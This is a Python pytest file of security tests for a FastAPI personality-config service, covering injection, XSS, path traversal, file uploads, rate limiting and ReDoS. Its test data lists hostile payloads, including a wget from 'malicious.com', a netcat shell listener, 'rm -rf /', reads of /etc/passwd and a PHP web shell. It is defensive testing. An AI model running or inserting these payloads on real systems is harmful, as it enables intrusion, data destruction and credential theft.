"""Security tests for input validation and file system operations."""

import os
import tempfile
import json
import time
from pathlib import Path
from typing import Dict, Any

import pytest
from fastapi.testclient import TestClient

from src.covibe.api.main import app
from src.covibe.utils.validation import validate_personality_description, sanitize_input
from src.covibe.integrations.ide_writers import write_cursor_config


class TestInputValidationSecurity:
    """Security tests for input validation."""
    
    @pytest.fixture
    def client(self):
        """Create test client."""
        return TestClient(app)
    
    def test_sql_injection_prevention(self, client):
        """Test prevention of SQL injection attacks."""
        malicious_inputs = [
            "'; DROP TABLE personalities; --",
            "' OR '1'='1",
            "'; DELETE FROM users; --",
            "' UNION SELECT * FROM passwords --",
            "admin'--",
            "' OR 1=1 --"
        ]
        
        for malicious_input in malicious_inputs:
            response = client.post(
                "/api/personality",
                json={
                    "description": malicious_input,
                    "user_id": "test_user",
                    "source": "api"
                }
            )
            
            # Should not cause server error or expose database structure
            assert response.status_code in [400, 422], f"Malicious input not properly handled: {malicious_input}"
            
            # Response should not contain SQL error messages
            response_text = response.text.lower()
            sql_keywords = ["syntax error", "mysql", "postgresql", "sqlite", "table", "column"]
            for keyword in sql_keywords:
                assert keyword not in response_text, f"SQL error exposed for input: {malicious_input}"
    
    def test_xss_prevention(self, client):
        """Test prevention of Cross-Site Scripting (XSS) attacks."""
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "javascript:alert('XSS')",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "';alert('XSS');//",
            "<iframe src='javascript:alert(\"XSS\")'></iframe>",
            "<body onload=alert('XSS')>",
            "<input onfocus=alert('XSS') autofocus>"
        ]
        
        for payload in xss_payloads:
            response = client.post(
                "/api/personality",
                json={
                    "description": payload,
                    "user_id": "test_user",
                    "source": "api"
                }
            )
            
            # Check that dangerous content is sanitized or rejected
            if response.status_code == 200:
                response_data = response.json()
                # Ensure no script tags or javascript: protocols in response
                response_str = json.dumps(response_data).lower()
                assert "<script" not in response_str
                assert "javascript:" not in response_str
                assert "onerror=" not in response_str
                assert "onload=" not in response_str
    
    def test_command_injection_prevention(self):
        """Test prevention of command injection attacks."""
        command_injection_payloads = [
            "; ls -la",
            "| cat /etc/passwd",
            "&& rm -rf /",
            "; wget http://malicious.com/script.sh",
            "$(whoami)",
            "`id`",
            "; python -c 'import os; os.system(\"rm -rf /\")'",
            "| nc -l -p 1234 -e /bin/sh"
        ]
        
        for payload in command_injection_payloads:
            # Test input sanitization
            sanitized = sanitize_input(payload)
            
            # Should not contain command injection characters
            dangerous_chars = [";", "|", "&", "$", "`", "(", ")"]
            for char in dangerous_chars:
                if char in payload:
                    assert char not in sanitized or sanitized.count(char) < payload.count(char), \
                        f"Command injection character not properly sanitized: {char} in {payload}"
    
    def test_path_traversal_prevention(self):
        """Test prevention of path traversal attacks."""
        path_traversal_payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "....//....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "..%252f..%252f..%252fetc%252fpasswd",
            "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
            "/var/www/../../etc/passwd",
            "....\\....\\....\\etc\\passwd"
        ]
        
        with tempfile.TemporaryDirectory() as temp_dir:
            temp_path = Path(temp_dir)
            
            # Create a test personality config
            test_config = {
                "id": "test-config",
                "profile": {
                    "name": "Test",
                    "traits": [],
                    "communication_style": {}
                },
                "context": "Test context",
                "ide_type": "cursor",
                "file_path": "",
                "active": True
            }
            
            for payload in path_traversal_payloads:
                test_config["file_path"] = payload
                
                # Attempt to write with malicious path
                result = write_cursor_config(test_config, temp_path)
                
                # Should either fail or write to safe location
                if result.get("success"):
                    written_path = Path(result["file_path"])
                    # Ensure file was written within the project directory
                    assert temp_path in written_path.parents or written_path == temp_path, \
                        f"Path traversal not prevented: {payload} -> {written_path}"
                else:
                    # Failure is acceptable for security
                    assert "path" in result.get("error", "").lower() or \
                           "invalid" in result.get("error", "").lower()
    
    def test_file_upload_security(self, client):
        """Test file upload security measures."""
        # Test with various file types that should be rejected
        dangerous_files = [
            ("malicious.exe", b"MZ\x90\x00", "application/octet-stream"),
            ("script.sh", b"#!/bin/bash\nrm -rf /", "text/plain"),
            ("virus.bat", b"@echo off\ndel /f /s /q C:\\*", "text/plain"),
            ("payload.php", b"<?php system($_GET['cmd']); ?>", "text/plain"),
            ("exploit.py", b"import os; os.system('rm -rf /')", "text/python")
        ]
        
        for filename, content, content_type in dangerous_files:
            response = client.post(
                "/api/personality/upload",
                files={"file": (filename, content, content_type)}
            )
            
            # Should reject dangerous file types
            assert response.status_code in [400, 415, 422], \
                f"Dangerous file type not rejected: {filename}"
    
    def test_input_length_limits(self, client):
        """Test input length validation."""
        # Test extremely long inputs
        very_long_input = "A" * 100000  # 100KB of text
        
        response = client.post(
            "/api/personality",
            json={
                "description": very_long_input,
                "user_id": "test_user",
                "source": "api"
            }
        )
        
        # Should reject or truncate extremely long inputs
        assert response.status_code in [400, 413, 422], \
            "Extremely long input not properly handled"
    
    def test_rate_limiting_protection(self, client):
        """Test rate limiting protection."""
        # Simulate rapid requests from same source
        responses = []
        
        for i in range(100):  # Send 100 requests rapidly
            response = client.post(
                "/api/personality",
                json={
                    "description": f"Test personality {i}",
                    "user_id": "test_user",
                    "source": "api"
                }
            )
            responses.append(response)
        
        # Should eventually start rate limiting
        rate_limited_responses = [r for r in responses if r.status_code == 429]
        
        # At least some requests should be rate limited
        assert len(rate_limited_responses) > 0, "Rate limiting not working"
    
    def test_authentication_bypass_attempts(self, client):
        """Test authentication bypass attempts."""
        bypass_attempts = [
            {"Authorization": "Bearer fake_token"},
            {"Authorization": "Bearer "},
            {"Authorization": "Basic YWRtaW46YWRtaW4="},  # admin:admin
            {"X-API-Key": "fake_key"},
            {"X-Auth-Token": "bypass_token"}
        ]
        
        for headers in bypass_attempts:
            response = client.get("/api/personality/admin", headers=headers)
            
            # Should not allow unauthorized access
            assert response.status_code in [401, 403], \
                f"Authentication bypass possible with headers: {headers}"
    
    def test_sensitive_data_exposure(self, client):
        """Test for sensitive data exposure in responses."""
        response = client.post(
            "/api/personality",
            json={
                "description": "Test personality",
                "user_id": "test_user",
                "source": "api"
            }
        )
        
        if response.status_code == 200:
            response_data = response.json()
            response_str = json.dumps(response_data).lower()
            
            # Check for sensitive information that shouldn't be exposed
            sensitive_keywords = [
                "password", "secret", "key", "token", "private",
                "database", "connection", "config", "env"
            ]
            
            for keyword in sensitive_keywords:
                assert keyword not in response_str, \
                    f"Sensitive data potentially exposed: {keyword}"
    
    def test_file_system_security(self):
        """Test file system operation security."""
        with tempfile.TemporaryDirectory() as temp_dir:
            temp_path = Path(temp_dir)
            
            # Test writing to various locations
            test_paths = [
                "/etc/passwd",
                "/tmp/malicious_file",
                "C:\\Windows\\System32\\malicious.exe",
                "/usr/bin/malicious",
                "/home/user/.ssh/authorized_keys"
            ]
            
            test_config = {
                "id": "test-config",
                "profile": {"name": "Test"},
                "context": "Test context",
                "ide_type": "cursor",
                "active": True
            }
            
            for test_path in test_paths:
                test_config["file_path"] = test_path
                
                result = write_cursor_config(test_config, temp_path)
                
                # Should not write to system locations
                if result.get("success"):
                    written_path = Path(result["file_path"])
                    # Ensure file is within safe directory
                    assert temp_path in written_path.parents, \
                        f"Unsafe file write allowed: {test_path}"
    
    def test_regex_dos_prevention(self):
        """Test prevention of Regular Expression Denial of Service (ReDoS)."""
        # Patterns that could cause ReDoS
        redos_patterns = [
            "a" * 10000 + "X",  # Catastrophic backtracking
            "(" + "a" * 1000 + ")*b",
            "a" * 5000 + "!" + "a" * 5000,
            "(a+)+b" + "a" * 1000,
            "(a|a)*b" + "a" * 1000
        ]
        
        for pattern in redos_patterns:
            start_time = time.time()
            
            # Test validation function with potentially malicious pattern
            try:
                result = validate_personality_description(pattern)
                processing_time = time.time() - start_time
                
                # Should not take excessive time to process
                assert processing_time < 1.0, \
                    f"Potential ReDoS vulnerability with pattern: {pattern[:50]}..."
                
            except Exception as e:
                # Exceptions are acceptable for malicious input
                processing_time = time.time() - start_time
                assert processing_time < 1.0, \
                    f"ReDoS caused timeout with pattern: {pattern[:50]}..."
    
    def test_json_parsing_security(self, client):
        """Test JSON parsing security."""
        # Test with malformed JSON that could cause issues
        malicious_json_payloads = [
            '{"description": "' + '"' * 10000 + '"}',  # Excessive quotes
            '{"description": "test", "extra": ' + '{"nested": ' * 1000 + '"value"' + '}' * 1000 + '}',  # Deep nesting
            '{"description": "test", "array": [' + '"item",' * 10000 + '"last"]}',  # Large array
        ]
        
        for payload in malicious_json_payloads:
            response = client.post(
                "/api/personality",
                data=payload,
                headers={"Content-Type": "application/json"}
            )
            
            # Should handle malicious JSON gracefully
            assert response.status_code in [400, 413, 422], \
                f"Malicious JSON not properly handled: {payload[:100]}..."
    
    def test_environment_variable_exposure(self):
        """Test for environment variable exposure."""
        # Test that sensitive environment variables are not exposed
        sensitive_env_vars = [
            "DATABASE_URL", "SECRET_KEY", "API_KEY", "PASSWORD",
            "TOKEN", "PRIVATE_KEY", "AWS_SECRET", "OPENAI_API_KEY"
        ]
        
        # This would be tested in actual API responses
        # For now, just ensure they're not accidentally logged or exposed
        import logging
        
        # Capture log output
        log_capture = []
        
        class TestHandler(logging.Handler):
            def emit(self, record):
                log_capture.append(record.getMessage())
        
        handler = TestHandler()
        logger = logging.getLogger()
        logger.addHandler(handler)
        
        try:
            # Simulate some operations that might log sensitive data
            from src.covibe.services.research import research_personality
            
            # This should not log sensitive environment variables
            # (This is a placeholder - actual implementation would test real operations)
            
            # Check that no sensitive data was logged
            log_text = " ".join(log_capture).lower()
            for env_var in sensitive_env_vars:
                assert env_var.lower() not in log_text, \
                    f"Sensitive environment variable exposed in logs: {env_var}"
        
        finally:
            logger.removeHandler(handler)